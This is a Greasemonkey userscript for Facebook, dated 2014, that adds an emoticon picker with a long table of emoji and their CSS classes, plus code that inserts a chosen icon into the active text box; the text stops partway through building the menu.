﻿﻿// ==UserScript==
// @name            Hướng Dẫn Cài ICON Facebook
// @description     UPDATE 12/03/2014 (New)
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
